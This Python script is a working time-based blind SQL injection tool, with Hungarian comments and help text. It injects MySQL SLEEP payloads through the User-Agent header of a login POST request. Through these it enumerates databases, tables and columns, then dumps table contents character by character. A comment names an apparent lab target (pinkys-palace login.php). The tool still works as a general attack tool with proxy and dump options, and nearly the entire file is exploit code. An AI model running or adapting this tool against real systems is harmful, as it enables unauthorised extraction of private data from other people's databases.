#!/usr/bin/python3
"""


Blind sqli - Pizs\x69


"""

import requests
import argparse

            
#PARAMÉTEREK
url = ""
use_db =""
use_table=""

szo_hossz = 20
ascii_set = 122

dump_count=10
dump_karakter_hossz = 32

database_num = 3
table_num = 10
column_num = 10

data = {'user':'teszt','pass':'teszt'}

#CONFIG
#http://pinkys-palace:8080/littlesecrets-main/login.php


response_delay = 1

http_proxy  = ""
https_proxy = ""
proxyDict = { 
              "http"  : http_proxy,
              "https" : https_proxy
            }

#COMMON
nincs_tovabb = False
column_list =[]

def main():
        print("\n")
        print("Pizs\\x69 Blind SQL injection")
        print("\n")

        parser = argparse.ArgumentParser()
        parser.add_argument("-u","--url",help="Adjon megy egy utl-t",type=str)
        parser.add_argument("-p","--proxy_http",help="Adjon megy egy http proxyt",type=str)
        parser.add_argument("-ps","--proxy_https",help="Adjon megy egy https proxyt",type=str)

        parser.add_argument("--dbs",action='store_true')
        parser.add_argument("-D","--databases",help="Adjon meg egy adatbázis nevet.",type=str)
        parser.add_argument("--tables",action='store_true')
        parser.add_argument("-T","--table",help="Adjon meg egy tábla nevet.",type=str)
        parser.add_argument("--dump",help="Szükséges hozzá: -D <adatbázis név> -T <tábla név>.",action='store_true')

        parser.add_argument("-rt","--response_time",help="Adja meg a késletetés értékét. (default = 1 )",type=int)

        args = parser.parse_args()

        global url
        global use_table
        global use_db
        global http_proxy
        global https_proxy
        global proxyDict
        global response_delay

        if(args.proxy_http):
                if(args.proxy_https):
                        proxyDict["http"]=args.proxy_http
                else:
                        proxyDict["http"]=args.proxy_http              
                        proxyDict["https"]=args.proxy_http
        if(args.proxy_https):
                proxyDict["https"]=args.proxy_http

        if(args.response_time):
                response_delay=args.response_time

        
        if(args.url):
                url = args.url
                if(args.dbs==None and args.databases==None and args.tables==None):
                        print("Hinyzó paraméterek, használd a --help-et vagy a --dbs kapcsolót.")
                if(args.databases):
                        use_db=args.databases 
                if(args.table):
                        use_table=args.table

                if(args.dbs):
                        Databases_enum()

                if(args.tables):

                        if(args.databases):                             
                                Tables_enum()
                        else:
                                print("Adjon megy egy adatbázis nevet --DB kapcsolóval")
                if(args.table):
                        if(args.dump):
                                Columns_enum()
                                Data_dumps()

        else:
                print("Nincs megadva ULR")
        
        quit()


            

def Tables_enum():  
        for t in range(table_num+1):

                table_name = f"{t+1}. table name: "
                print(table_name,end ='',flush=True)
                ures =0
                for x in range(szo_hossz+1):

                        for i in reversed(range(ascii_set)):
                                
                                
                                
                                headers = {'User-Agent':f'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\'\
                                                AND (SELECT 7285 FROM (SELECT(SLEEP({response_delay}-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) \
                                                FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'{use_db}\' LIMIT {t},1),{x},1))>\'{i}\',0,{response_delay})))))LreY) AND \'OacN\'=\'OacN'}

                                r = requests.post(url,proxies=proxyDict,headers=headers,data=data)


                                if r.elapsed.total_seconds()>=response_delay:
                                        print(chr(i+1), end = '',flush=True)
                                        break

                                if i==0:
                                        ures+=1
                                
                                if ures ==3:
                                        #print()
                                        break
                print()


def Databases_enum():
        for d in range(database_num+1):

                db_name = f"{d+1}. Database name: "
                print(db_name,end ='',flush=True)
                ures =0
                for x in range(szo_hossz+1):

                        for i in reversed(range(ascii_set)):
                                
                                
                                headers = {'User-Agent':f'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\' \
                                                AND (SELECT 9210 FROM (SELECT(SLEEP({response_delay}-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) \
                                                FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {d},1),{x},1))>\'{i}\',0,{response_delay})))))GQCe) AND \'kpLh\'=\'kpLh'}

                                r = requests.post(url,proxies=proxyDict,headers=headers,data=data)


                                if r.elapsed.total_seconds()>=response_delay:
                                        print(chr(i+1), end = '',flush=True)
                                        break

                                if x<5 and i==0:
                                        ures+=1
                                
                                if ures ==3:
                                        print()
                                        quit()
                
                
                print()



def Columns_enum():
        global nincs_tovabb
        nincs_tovabb=False
        for c in range(column_num+1):

                ures =0
                name_tmp = ""
                for x in range(szo_hossz+1):
                        
                
                        for i in reversed(range(ascii_set)):
                                
                               
                                headers = {'User-Agent':f'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\'\
                                        AND (SELECT 1950 FROM (SELECT(SLEEP({response_delay}-(IF(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) \
                                        FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=\'{use_table}\' AND table_schema=\'{use_db}\' \
                                        LIMIT {c},1),{x},1))>\'{i}\',0,{response_delay})))))qfAf) AND \'LOdK\'=\'LOdK'}

                                r = requests.post(url,proxies=proxyDict,headers=headers,data=data)


                                if r.elapsed.total_seconds()>=response_delay:
                                        print(chr(i+1), end = '',flush=True)
                                        name_tmp=name_tmp+str(chr(i+1))
                                        break

                                if i==0:
                                        ures+=1

                                
                                if ures ==3:
                                        if x<3:
                                                nincs_tovabb=True
                                        break

                column_list.append(name_tmp)
                #print()
                print("\t\t\t",end='',flush=True)
                if nincs_tovabb:
                        break


def Data_dumps():
        
        #for oszlop in column_list:
        #               print(oszlop+"\t\t\t",end='',flush=True)
        print()
        for dump in range(dump_count+1):
                data_over = 0

                for column in range(len(column_list)):

                        ures =0
                        text_counter =0
                        for x in range(dump_karakter_hossz+1):
                                
                                
                                for i in reversed(range(ascii_set)):


                                        
                                        headers = {'User-Agent':f'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\' \
                                                AND (SELECT 9919 FROM (SELECT(SLEEP({response_delay}-(IF(ORD(MID((SELECT IFNULL(CAST({column_list[column]} AS NCHAR),0x20) FROM {use_db}.{use_table} \
                                                ORDER BY {column_list[0]} LIMIT {dump},1),{x},1))>\'{i}\',0,{response_delay})))))NmNI) AND \'nPWU\'=\'nPWU'}

                                        r = requests.post(url,proxies=proxyDict,headers=headers,data=data)

                                        
                                        if r.elapsed.total_seconds()>=response_delay:
                                                print(chr(i+1), end = '',flush=True)
                                                text_counter+=1
                                                break

                                        if i==0:
                                                ures+=1

                                        if ures ==3:
                                                if x<3:
                                                        data_over+=1
                                                break 

                        if(text_counter>10):
                                if(text_counter>20):
                                        print("\t",end='',flush=True)
                                else:
                                        print("\t\t",end='',flush=True)
                        else:
                                print("\t\t\t",end='',flush=True)

                        
                if data_over>3:
                        print("\n\n")
                        break
                print()


if __name__ == "__main__":
    main()





